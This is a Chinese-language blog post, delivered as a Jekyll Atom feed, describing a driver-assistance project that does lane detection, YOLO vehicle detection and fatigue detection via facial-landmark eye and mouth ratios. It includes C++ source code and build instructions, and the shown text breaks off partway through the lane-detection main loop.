<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-07-01T15:39:03+08:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">lazycat</title><subtitle>lazycat&lt;br/&gt;
&lt;a href=&quot;mailto:verylazycat@outlook.com&quot;&gt;
  &lt;i class=&quot;fas fa-envelope&quot;&gt;&lt;/i&gt;
&lt;/a&gt;
&lt;a href=&quot;https://github.com/verylazycat&quot;&gt;
  &lt;i class=&quot;fab fa-github&quot;&gt;&lt;/i&gt;
&lt;/a&gt;
</subtitle><entry><title type="html">车道保持&amp;amp;疲劳驾驶检测</title><link href="http://localhost:4000/_posts/2020-07-01-%E8%BD%A6%E9%81%93%E4%BF%9D%E6%8C%81&%E7%96%B2%E5%8A%B3%E9%A9%BE%E9%A9%B6%E6%A3%80%E6%B5%8B/" rel="alternate" type="text/html" title="车道保持&amp;疲劳驾驶检测" /><published>2020-07-01T00:00:00+08:00</published><updated>2020-07-01T00:00:00+08:00</updated><id>http://localhost:4000/_posts/%E8%BD%A6%E9%81%93%E4%BF%9D%E6%8C%81&amp;%E7%96%B2%E5%8A%B3%E9%A9%BE%E9%A9%B6%E6%A3%80%E6%B5%8B</id><content type="html" xml:base="http://localhost:4000/_posts/2020-07-01-%E8%BD%A6%E9%81%93%E4%BF%9D%E6%8C%81&amp;%E7%96%B2%E5%8A%B3%E9%A9%BE%E9%A9%B6%E6%A3%80%E6%B5%8B/">&lt;p&gt;[toc]&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/verylazycat/DriverAssistanceSystem&quot;&gt;github&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;有问题可私信我&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;功能模块&quot;&gt;功能模块&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;车道保持
    &lt;ul&gt;
      &lt;li&gt;车道线识别&lt;/li&gt;
      &lt;li&gt;航向判断&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;驾驶员行为及状态检测
    &lt;ul&gt;
      &lt;li&gt;疲劳检测&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;车道线车况识别总体流程图&quot;&gt;车道线&amp;amp;车况识别总体流程图&lt;/h1&gt;

&lt;h1&gt;&lt;img src=&quot;/img/detect.png&quot; alt=&quot;detect&quot; /&gt;&lt;/h1&gt;

&lt;p&gt;对输入的每一帧图像主要有如下处理：&lt;/p&gt;

&lt;p&gt;1.车道线识别：
	1.1.降噪
	1.2.边缘检测
	1.3.ROI处理
	1.4.霍夫线获取
	1.5.路线获取
	1.6.渲染&lt;/p&gt;

&lt;p&gt;2.车况识别：
	2.1.加载yolo网络
	2.2.前向传播
	3.3.渲染&lt;/p&gt;

&lt;h1 id=&quot;车道线识别主要操作&quot;&gt;车道线识别主要操作&lt;/h1&gt;

&lt;h1 id=&quot;-1&quot;&gt;&lt;img src=&quot;/img/车道线处理.png&quot; alt=&quot;车道线处理&quot; /&gt;&lt;/h1&gt;

&lt;h1 id=&quot;方向判断逻辑&quot;&gt;方向判断逻辑&lt;/h1&gt;

&lt;h1 id=&quot;-2&quot;&gt;&lt;img src=&quot;/img/方向判断.png&quot; alt=&quot;方向判断&quot; /&gt;&lt;/h1&gt;

&lt;p&gt;获得道路线后，即我们获取了两个方程:
&lt;script type=&quot;math/tex&quot;&gt;y1 = a1x1 + b1\\
y2 = a2x2 + b2&lt;/script&gt;
计算两直线交点(x0,y0),即左图所提的消失点；
此外，我们已知图像水平方向中心直线：x；&lt;/p&gt;

&lt;p&gt;由此，我们有如下判断依据：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;x0 &amp;gt; x + thr_vp :右转&lt;/li&gt;
  &lt;li&gt;x0 &amp;lt; x - thr_vp:左转&lt;/li&gt;
  &lt;li&gt;x0 &amp;gt;= (x - thr_vp) &amp;amp;&amp;amp; x0 &amp;lt;= (x + thr_vp)：直线&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;注：thr_vp为调整参数，根据实际情况调试&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h1 id=&quot;车况识别&quot;&gt;车况识别&lt;/h1&gt;

&lt;p&gt;基于深度学习的目标检测与识别算法大致分为以下三大类:
1.基于区域建议的目标检测与识别算法，如R-CNN, Fast-R-CNN, Faster-R-CNN;
2.基于回归的目标检测与识别算法，如YOLO, SSD;
3.基于搜索的目标检测与识别算法，如基于视觉注意的AttentionNet；&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;此处识别采用YOLO算法,其优点如下：
1.速度非常快。在Titan X GPU上的速度是45 fps，加速版的YOLO差不多是150fps；
2.YOLO是基于图像的全局信息进行预测的；
3.泛化能力强；
4.准确率高；&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;具体算法参考yolo论文&lt;/li&gt;
  &lt;li&gt;训练参考&lt;a href=&quot;https://pjreddie.com/darknet/yolo/&quot;&gt;DarkNet&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;注：由于笔记本计算能力有限，此处采用开源coco数据集训练的yolo模型，支持80个分类识别，具体分类参考配置文件&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;快速体验yolo&quot;&gt;快速体验yolo&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;安装&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;git clone https://github.com/pjreddie/darknet.git
cd darknet
make
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;输出如下内容即安装成功&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;mkdir -p obj
gcc -I/usr/local/cuda/include/ -Wall -Wfatal-errors -Ofast....
gcc -I/usr/local/cuda/include/ -Wall -Wfatal-errors -Ofast....
gcc -I/usr/local/cuda/include/ -Wall -Wfatal-errors -Ofast....
.....
gcc -I/usr/local/cuda/include/ -Wall -Wfatal-errors -Ofast -lm....
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;注意:根据自己环境调整 Makefile ,尤其是 GPU , CUDNN , OPENCV&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;下载weights文件&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;wget https://pjreddie.com/media/files/yolov .weights
&lt;/code&gt;&lt;/pre&gt;

&lt;ul&gt;
  &lt;li&gt;测试&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;./darknet detect cfg/yolov .cfg yolov .weights data/dog.jpg
&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&quot;驾驶员行为及状态检测&quot;&gt;驾驶员行为及状态检测&lt;/h1&gt;

&lt;h1 id=&quot;-3&quot;&gt;&lt;img src=&quot;/img/驾驶员行为及状态检测.png&quot; alt=&quot;驾驶员行为及状态检测&quot; /&gt;&lt;/h1&gt;

&lt;p&gt;关键操作有如下：&lt;/p&gt;

&lt;p&gt;1.保存驾驶人员启动程序时的状态数据&lt;/p&gt;

&lt;p&gt;2.判断是否无人驾驶&lt;/p&gt;

&lt;p&gt;3.依据记录的状态数据判断当前技术人员状态是否异常&lt;/p&gt;

&lt;h1 id=&quot;状态特征判断依据&quot;&gt;状态特征判断依据&lt;/h1&gt;

&lt;p&gt;有如下内容需要了解:&lt;/p&gt;

&lt;p&gt;1.“眼睛纵横比”（EAR）
我们可以应用面部标志检测来定位脸部的重要区域，包括眼睛，眉毛，鼻子，耳朵和嘴巴&lt;/p&gt;

&lt;p&gt;2.EAR计算公式
&lt;script type=&quot;math/tex&quot;&gt;EAR = (||p_{2} - p_{6}||+||p_{3}-p_{5}||)/(2||p_{1} -p_{4}||)&lt;/script&gt;
&lt;img src=&quot;/img/eyeEar.png&quot; alt=&quot;eyeEar&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;详细内容参考Soukupová和Čech在其2016年的论文Real-Time Eye Blink Detection using Facial Landmarks&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;landmark算法&quot;&gt;Landmark算法&lt;/h2&gt;

&lt;p&gt;点标记》一文中有效果和标定点序号的示意图。今后可采用landmark中的点提取眼睛区域、嘴巴区
域用于疲劳检测,提取鼻子等部分可用于3D姿态估计。
Dlib库使用《One Millisecond Face Alignment with an Ensemble of Regression Trees》CVPR2014
中提及的算法:ERT(ensemble of regression trees)级联回归,即基于梯度提高学习的回归树方法。
该算法使用级联回归因子,首先需要使用一系列标定好的人脸图片作为训练集,然后会生成一个模型。
使用基于特征选择的相关性方法把目标输出投影到一个随机方向w上,并且选择一对特征(u,v),使
得Ii(u )-Ii(v )与被投影的目标wTri在训练数据上拥有最高的样本相关性。
当获得一张图片后,算法会生成一个initial shape就是首先估计一个大致的特征点位置,然后采用
gradient boosting算法减小initial shape 和 ground truth 的平方误差总和。用最小二乘法来最小化误
差,得到每一级的级联回归因子。核心公式如下:
&lt;script type=&quot;math/tex&quot;&gt;\hat{S}^{t+1} = \hat{S}+r_{t}(I,\hat{t}^{t})&lt;/script&gt;
示当前级的回归器regressor。回归器的输入参数为图像I和上一级回归器更新后的shape,采用的特征可
以是灰度值或者其它。每个回归器由很多棵树(tree)组成,每棵树参数是根据current shape和ground
truth的坐标差和随机挑选的像素对训练得到的。&lt;/p&gt;

&lt;p&gt;与LBF不同,ERT是在学习Tree的过程中,直接将shape的更新值ΔS存入叶子结点leaf node.初始位
置S在通过所有学习到的Tree后,meanshape加上所有经过的叶子结点的ΔS,即可得到最终的人脸关
键点位置。&lt;/p&gt;

&lt;h1 id=&quot;ear参考意义&quot;&gt;EAR参考意义&lt;/h1&gt;

&lt;p&gt;“眼睛纵横比”(EAR):我们可以应用面部标志检测来定位脸部的重要区域,包括眼睛,眉毛,鼻子,
耳朵和嘴巴.&lt;/p&gt;

&lt;p&gt;1.其中p1…p6是2D面部地标位置;
2.方程的分子是计算垂直眼睛标志之间的距离，而分母是计算水平眼睛标志之间的距离，因为只有一组水平点，但是有两组垂直点，所以进行加权分母&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/EAR.png&quot; alt=&quot;EAR&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;当人眼闭眼时，EAR急剧减小，我们利用这一点去检测人眼闭眼状态&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&quot;/img/EARTEST.png&quot; alt=&quot;EARTEST&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;源码&quot;&gt;源码&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;FatigueDrivingDetection&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;p&gt;main&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;/*
 * @Author: verylazycat 
 * @Date: 2020-02-05 14:56:20 
 * @Last Modified by: verylazycat
 * @Last Modified time: 2020-02-09 13:39:19
 */
#include &amp;lt;main.h&amp;gt;
#include &amp;lt;render_face.h&amp;gt;
#include &amp;lt;Compute.h&amp;gt;
#include &amp;lt;BuzzerControl.h&amp;gt;
#include &amp;lt;fatigueDetection.h&amp;gt;
#include &amp;lt;getTime.h&amp;gt;
int main()
{
	//判断的基础信息
	double LeftEyeBase,RightEyeBase,InnerLipBase;
	//标志位,用于第一次录入基础信息
	int Base = 1;
	//记录哈欠次数
	int innerLipCounts = 0;
	//记录眯眼次数
	int squintingCounts = 0;
	try
	{
		//读取摄像头
		cv::VideoCapture cap(0);
		// 窗体大小设置,看需求
		//cap.set(CV_CAP_PROP_FRAME_WIDTH, 640);  
		//cap.set(CV_CAP_PROP_FRAME_HEIGHT, 480);  
		//模型加载 
		frontal_face_detector detector = get_frontal_face_detector();
		shape_predictor pose_model;
		deserialize(datPath) &amp;gt;&amp;gt; pose_model;
 
		int count = 0;
		std::vector&amp;lt;dlib::rectangle&amp;gt; faces;

		while (1)
		{
			cv::Mat img, img_small;
			cap &amp;gt;&amp;gt; img;
			//文字
			cv::putText(img,&quot;s:save,q:quit&quot;,cv::Point(img.rows/2,img.cols/2),FONT_HERSHEY_SIMPLEX,2,Scalar(0,0,255),1,8,false);
			cv::resize(img, img_small, cv::Size(), 1.0 / RATIO, 1.0 / RATIO);
 
			cv_image&amp;lt;bgr_pixel&amp;gt; cimg(img);
			cv_image&amp;lt;bgr_pixel&amp;gt; cimg_small(img_small);
 
			//人脸检测   
			if (count++ % SKIP_FRAMES == 0) {
				faces = detector(cimg_small);
			}
			cout &amp;lt;&amp;lt; &quot;检测人数:&quot; &amp;lt;&amp;lt; faces.size() &amp;lt;&amp;lt; endl;
			//无人状态
			if(faces.empty())
			{
				cout  &amp;lt;&amp;lt; &quot;\033[31m警告:无人状态\033[0m&quot;&amp;lt;&amp;lt; endl;
				//蜂鸣器功能,后续添加
				// BuzzerControl();
				getCurrentTime();
			}

			// 关键点检测  
			std::vector&amp;lt;full_object_detection&amp;gt; shapes;
			for (unsigned long i = 0; i &amp;lt; faces.size(); ++i) 
			{
				dlib::rectangle r(
					(long)(faces[i].left() * RATIO),
					(long)(faces[i].top() * RATIO),
					(long)(faces[i].right() * RATIO),
					(long)(faces[i].bottom() * RATIO)
				);
				// 关键点保存
				full_object_detection shape = pose_model(cimg, r);
				shapes.push_back(shape);
 
				//渲染画线
				render_face(img, shape);
				double rightEye = RightEyeCompute(img,shape);
				double leftEye = LeftEyeCompute(img,shape);
				double innerLip = InnerLipCompute(img,shape);
				cout&amp;lt;&amp;lt;&quot;-------------&quot;&amp;lt;&amp;lt;endl;

				//第一次识别信息导入,以此为后续判断的标注
				//RightEyeBase,LeftEyeBase,innerLipBase
				if(Base)
				{
					RightEyeBase = rightEye;
					LeftEyeBase = leftEye;
					InnerLipBase = innerLip;
					//退出信息录入,避免后续覆盖
					Base--;
					cout&amp;lt;&amp;lt;&quot;用户数据录入成功&amp;gt;&amp;gt;&amp;gt;初始化成功!&quot;&amp;lt;&amp;lt;endl;
				}
				int temp = fatigueDetection(LeftEyeBase,leftEye,RightEyeBase,rightEye,InnerLipBase,innerLip,innerLipCounts,squintingCounts);
				innerLipCounts += temp;
				squintingCounts += temp;
				//疲劳驾驶
				// innerLipCounts 哈欠次数 需要实际调试确定临界点
				if(innerLipCounts &amp;gt;= 50)
				{
					//红色打印
					cout  &amp;lt;&amp;lt; &quot;\033[31m警告:疲劳驾驶\033[0m&quot;&amp;lt;&amp;lt; endl;	
					getCurrentTime();	
				}
				// squintingCounts 眯眼次数
				if(squintingCounts &amp;gt;= 50)
				{
					//红色打印
					cout  &amp;lt;&amp;lt; &quot;\033[31m警告:疲劳驾驶\033[0m&quot;&amp;lt;&amp;lt; endl;	
					getCurrentTime();
				}
				//----------------------------------------------------
			}
			// std::cout &amp;lt;&amp;lt; &quot;count:&quot; &amp;lt;&amp;lt; count &amp;lt;&amp;lt; std::endl;
			if (img.empty())
			{
				cerr&amp;lt;&amp;lt;&quot;img is mepty!&quot;&amp;lt;&amp;lt;endl;
				getCurrentTime();
				break;
			}
			imshow(&quot;Frame&quot;, img);
			// Q q退出
			char c = (char)waitKey(25);
			if (c == 'Q' || c == 'q')
			{
				cout&amp;lt;&amp;lt;&quot;退出成功&quot;&amp;lt;&amp;lt;endl;
				getCurrentTime();
				break;
			}
			if(c == 's'||c == 'S')
			{
				cv::imwrite(&quot;../img/img.png&quot;,img);
				cout&amp;lt;&amp;lt;&quot;保存成功&quot;&amp;lt;&amp;lt;endl;
				getCurrentTime();
			}
		}
	}
	catch (serialization_error&amp;amp; e)
	{
		cout &amp;lt;&amp;lt; &quot;模型下载链接 &quot; &amp;lt;&amp;lt; endl;
		cout &amp;lt;&amp;lt; &quot;http://dlib.net/files/shape_predictor_68_face_landmarks.dat.bz2&quot; &amp;lt;&amp;lt; endl;
		cout &amp;lt;&amp;lt; endl &amp;lt;&amp;lt; e.what() &amp;lt;&amp;lt; endl;
		getCurrentTime();
	}
	catch (exception&amp;amp; e)
	{
		cout &amp;lt;&amp;lt; e.what() &amp;lt;&amp;lt; endl;
		getCurrentTime();
	}
	return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;BuzzerControl.h&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/*
 * @Author: verylazycat 
 * @Date: 2020-02-07 12:15:16 
 * @Last Modified by: verylazycat
 * @Last Modified time: 2020-02-08 13:18:52
 */
// 蜂鸣器控制
#include &amp;lt;main.h&amp;gt;
int BuzzerControl()
{
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;Compute.h&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;/*
 * @Author: verylazycat 
 * @Date: 2020-02-06 12:29:42 
 * @Last Modified by: verylazycat
 * @Last Modified time: 2020-02-08 13:19:28
 */
#include &amp;lt;main.h&amp;gt;
#include &amp;lt;cmath&amp;gt;
// 欧式距离计算
double PointsCompute(int x1,int y1,int x2,int y2)
{
    double results = 0;
    results = sqrt(pow(x1-x2,2) + pow(y1 - y2,2));
    return results;
}
// Right Eye:42~47
double RightEyeCompute(cv::Mat &amp;amp;img,const dlib::full_object_detection&amp;amp; d)
{
    double result = 0;
    std::vector&amp;lt;cv::Point&amp;gt; points;
    for(int i = 42;i &amp;lt;=47;++i)
    {
        points.push_back(cv::Point(d.part(i).x(), d.part(i).y()));
    }
    result = (PointsCompute(points[1].x,points[1].y,points[5].x,points[5].y) + PointsCompute(points[2].x,points[2].y,points[4].x,points[4].y))/(2*PointsCompute(points[0].x,points[0].y,points[3].x,points[3].y)); 
    cout&amp;lt;&amp;lt;&quot;右眼高宽比例:&quot;;
    cout&amp;lt;&amp;lt;result&amp;lt;&amp;lt;endl;
    return result;
}
//Left Eye:36 ~ 41
double LeftEyeCompute(cv::Mat &amp;amp;img,const dlib::full_object_detection&amp;amp; d)
{
    double result = 0;
    std::vector&amp;lt;cv::Point&amp;gt; points;
    for(int i = 36;i &amp;lt;=41;++i)
    {
        points.push_back(cv::Point(d.part(i).x(), d.part(i).y()));
    }
    result = (PointsCompute(points[1].x,points[1].y,points[5].x,points[5].y) + PointsCompute(points[2].x,points[2].y,points[4].x,points[4].y))/(2*PointsCompute(points[0].x,points[0].y,points[3].x,points[3].y)); 
    cout&amp;lt;&amp;lt;&quot;左眼高宽比例:&quot;;
    cout&amp;lt;&amp;lt;result&amp;lt;&amp;lt;endl;
    return result;
}
//inner lip :60 ~ 67
double InnerLipCompute(cv::Mat &amp;amp;img,const dlib::full_object_detection&amp;amp; d)
{
    double result = 0;
    std::vector&amp;lt;cv::Point&amp;gt; points;
    for(int i = 60;i &amp;lt;=67;++i)
    {
        points.push_back(cv::Point(d.part(i).x(), d.part(i).y()));
    }
    result = (PointsCompute(points[1].x,points[1].y,points[7].x,points[7].y) + PointsCompute(points[3].x,points[3].y,points[5].x,points[5].y))/(2*PointsCompute(points[0].x,points[0].y,points[4].x,points[4].y)); 
    cout&amp;lt;&amp;lt;&quot;内嘴唇高宽比例:&quot;;
    cout&amp;lt;&amp;lt;result&amp;lt;&amp;lt;endl;
    return result;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;fatigueDetection.h&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;/*
 * @Author: verylazycat 
 * @Date: 2020-02-09 12:41:21 
 * @Last Modified by: verylazycat
 * @Last Modified time: 2020-02-09 13:41:51
 */
//警告状态
#include &amp;lt;main.h&amp;gt;
int fatigueDetection(double leftEyeBase,double leftEye,double rightEyeBase,double rightEye,double innerLipBase,double innerLip,int innerLipCounts,int squintingCounts)
{
    //当内嘴唇高宽比例大于基础高宽比0.,定义位打哈欠
    if(innerLip - innerLipBase &amp;gt;= 0.3)
    {
        //绿色打印
        cout  &amp;lt;&amp;lt; &quot;\033[32m警告:哈欠:\033[0m&quot;&amp;lt;&amp;lt;innerLipCounts&amp;lt;&amp;lt; endl;
        //计数
        return 1;
    }
    if(leftEyeBase - leftEye &amp;gt;=0.1 || rightEyeBase - rightEye &amp;gt;= 0.1)
    {
        //绿色打印
        cout  &amp;lt;&amp;lt; &quot;\033[32m警告:眯眼:\033[0m&quot;&amp;lt;&amp;lt;squintingCounts&amp;lt;&amp;lt; endl;
        //计数
        return 1;
    }
    if((leftEye + rightEye)/2 &amp;lt; 0.2)
    {
        // 绿色打印
        cout  &amp;lt;&amp;lt; &quot;\033[32m警告:闭眼\033[0m&quot;&amp;lt;&amp;lt; endl;	
    }
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;getTime.h&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;/*
 * @Author: verylazycat 
 * @Date: 2020-02-09 13:27:35 
 * @Last Modified by: verylazycat
 * @Last Modified time: 2020-02-09 13:37:06
 */
#include &amp;lt;main.h&amp;gt;
void getCurrentTime()
{
    time_t rawtime;
    struct tm *ptminfo;
 
    time(&amp;amp;rawtime);
    ptminfo = localtime(&amp;amp;rawtime);
    printf(&quot;current: %02d-%02d-%02d %02d:%02d:%02d\n&quot;,
            ptminfo-&amp;gt;tm_year + 1900, ptminfo-&amp;gt;tm_mon + 1, ptminfo-&amp;gt;tm_mday,
            ptminfo-&amp;gt;tm_hour, ptminfo-&amp;gt;tm_min, ptminfo-&amp;gt;tm_sec);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;main.h&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;/*
 * @Author: verylazycat 
 * @Date: 2020-02-06 11:26:56 
 * @Last Modified by: verylazycat
 * @Last Modified time: 2020-02-09 13:36:59
 */
#ifndef __BUILD__
#define __BUILD__
#include &amp;lt;dlib/opencv.h&amp;gt;  
#include &amp;lt;opencv2/opencv.hpp&amp;gt;  
#include &amp;lt;dlib/image_processing/frontal_face_detector.h&amp;gt;  
#include &amp;lt;dlib/image_processing/render_face_detections.h&amp;gt;  
#include &amp;lt;dlib/image_processing.h&amp;gt;  
#include &amp;lt;dlib/gui_widgets.h&amp;gt;  
#include &quot;opencv2/opencv.hpp&quot;
#include &amp;lt;iostream&amp;gt;
#include &amp;lt;ctime&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;sys/ioctl.h&amp;gt;

using namespace dlib;
using namespace std;
using namespace cv;

#define RATIO 4  
#define SKIP_FRAMES 2 

cv::String datPath = &quot;../config/shape_predictor_68_face_landmarks.dat&quot;;

#endif
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;render_face.h&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;/*
 * @Author: verylazycat 
 * @Date: 2020-02-06 11:57:30 
 * @Last Modified by: verylazycat
 * @Last Modified time: 2020-02-08 13:19:01
 */
#include &amp;lt;main.h&amp;gt;
// 画线 
void draw_polyline(cv::Mat &amp;amp;img, const dlib::full_object_detection&amp;amp; d, const int start, const int end, bool isClosed = false)
{
	std::vector &amp;lt;cv::Point&amp;gt; points;
	for (int i = start; i &amp;lt;= end; ++i)
	{
		points.push_back(cv::Point(d.part(i).x(), d.part(i).y()));
	}
	cv::polylines(img, points, isClosed, cv::Scalar(255, 0, 0), 2, 16);
}
// 渲染 
void render_face(cv::Mat &amp;amp;img, const dlib::full_object_detection&amp;amp; d)
{
	DLIB_CASSERT
	(
		d.num_parts() == 68,
		&quot;\n\t Invalid inputs were given to this function. &quot;
		&amp;lt;&amp;lt; &quot;\n\t d.num_parts():  &quot; &amp;lt;&amp;lt; d.num_parts()
	);
 
	draw_polyline(img, d, 0, 16);           // Jaw line
	draw_polyline(img, d, 17, 21);          // Left eyebrow
	draw_polyline(img, d, 22, 26);          // Right eyebrow
	draw_polyline(img, d, 27, 30);          // Nose bridge
	draw_polyline(img, d, 30, 35, true);    // Lower nose
	draw_polyline(img, d, 36, 41, true);    // Left eye
	draw_polyline(img, d, 42, 47, true);    // Right Eye
	draw_polyline(img, d, 48, 59, true);    // Outer lip
	draw_polyline(img, d, 60, 67, true);    // Inner lip
 
}
&lt;/code&gt;&lt;/pre&gt;

&lt;blockquote&gt;
  &lt;p&gt;CMakeLists.txt&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-makefile&quot;&gt;#SET CMAKE VERSION
CMAKE_MINIMUM_REQUIRED(VERSION 2.8)
# 优化
# SET(CMAKE_C_FLAGS &quot;${CMAKE_C_FLAGS} -O2&quot;)
SET(CMAKE_CXX_FLAGS &quot;${CMAKE_CXX_FLAGS} -Ofast&quot;)
#SET PROJECT NAME
SET(PROJECT_NAME FatigueDrivingDetection)
#BUILD PROJECT NAME
PROJECT(${PROJECT_NAME})
#FIND OPENCV 
FIND_PACKAGE(OpenCV REQUIRED)
INCLUDE_DIRECTORIES(${OpenCV_INCLUDE_DIRS})
#FIND DLIB
FIND_PACKAGE(dlib REQUIRED)
INCLUDE_DIRECTORIES(${dlib_INCLUDE_DIRS})
#PRINT STATUS
MESSAGE(STATUS &quot;Project: ${PROJECT_NAME}&quot;)
MESSAGE(STATUS &quot;------------------------------------------------------&quot;)
MESSAGE(STATUS &quot;OpenCV library status:&quot;)
MESSAGE(STATUS &quot;version: ${OpenCV_VERSION}&quot;)
MESSAGE(STATUS &quot;libraries: ${OpenCV_LIBS}&quot;)
MESSAGE(STATUS &quot;include path: ${OpenCV_INCLUDE_DIRS}&quot;)
MESSAGE(STATUS &quot;------------------------------------------------------&quot;)
MESSAGE(STATUS &quot;DLIB library status:&quot;)
MESSAGE(STATUS &quot;version: ${dlib_VERSION}&quot;)
MESSAGE(STATUS &quot;libraries: ${dlib_LIBS}&quot;)
MESSAGE(STATUS &quot;include path: ${dlib_INCLUDE_DIRS}&quot;)
MESSAGE(STATUS &quot;------------------------------------------------------&quot;)
#GET CODE FROM SRC FOLDER
AUX_SOURCE_DIRECTORY(src DIR_SRCS)
include_directories(include)
MESSAGE(STATUS &quot;Src file: ${DIR_SRCS}&quot;)
#编译可执行程序
ADD_EXECUTABLE(${PROJECT_NAME} ${DIR_SRCS})
#添加链接库
TARGET_LINK_LIBRARIES(${PROJECT_NAME} ${OpenCV_LIBS} ${dlib_LIBRARIES})
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;lane_car_detect&quot;&gt;lane_car_detect&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;main.cpp&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-c++&quot;&gt;/*
 * @Author: verylazycat 
 * @Date: 2020-04-17 12:39:24 
 * @Last Modified by: verylazycat
 * @Last Modified time: 2020-04-18 13:12:06
 */
#include &quot;yolo_car_detect.h&quot;
#include &quot;lane_detect.h&quot;
#include &amp;lt;iostream&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;error.h&amp;gt;

// 摄像头调用
// #define __USE__CAP_0__

//视频测试
#define __USE__VIDEO__

int main(int argc ,char *argv[]) 
{
	
	#ifdef  __USE__CAP_0__
	//摄像头测试
	cv::VideoCapture cap(0);
	#endif

	#ifdef  __USE__VIDEO__
	cv::VideoCapture cap(&quot;../video/test.mp4&quot;);
	#endif
	
	if (!cap.isOpened())
		return -1;
	//config检测
	configFileDect;
	//导入网络
    Net net = readNetFromDarknet(modelConfiguration, modelWeights);
    net.setPreferableBackend(DNN_BACKEND_OPENCV);
    net.setPreferableTarget(DNN_TARGET_CPU);
    Mat frame, blob;
	//lane检测
	LaneDetector lanedetector; 
	// frame处理
	while (i &amp;lt; 540) {
		//frame为空
		if (!cap.read(frame))
			break;
		//按照预先设定的参数初始化frame
        blobFromImage(frame, blob, 1/255.0, cvSize(inpWidth, inpHeight), Scalar(0,0,0), true, false);
        //将预处理后的frame输入网络
        net.setInput(blob);
        // 前向传播获取outs
        vector&amp;lt;Mat&amp;gt; outs;
        net.forward(outs, getOutputsNames(net));
        // 值信度抑制
		postprocess(frame, outs);
		//time
        vector&amp;lt;double&amp;gt; layersTimes;
        double f = getTickFrequency() / 1000;
        double t = net.getPerfProfile(layersTimes) / f;
        string label = format(&quot;Inference time for a frame : %.2f ms&quot;, t);
        putText(frame, label, Point(0, 15), FONT_HERSHEY_SIMPLEX, 0.5, Scalar(0, 0, 255));
		// 降噪
		img_denoise = lanedetector.deNoise(frame);
		//边缘检测
		img_edges = lanedetector.edgeDetector(img_denoise);
		// ROI
		img_mask = lanedetector.mask(img_edges);
		//霍夫线获取
		lines = lanedetector.houghLines(img_mask);
		if (!lines.empty())
		{
			//区分左右
			left_right_lines = lanedetector.lineSeparation(lines, img_edges);
			//过滤
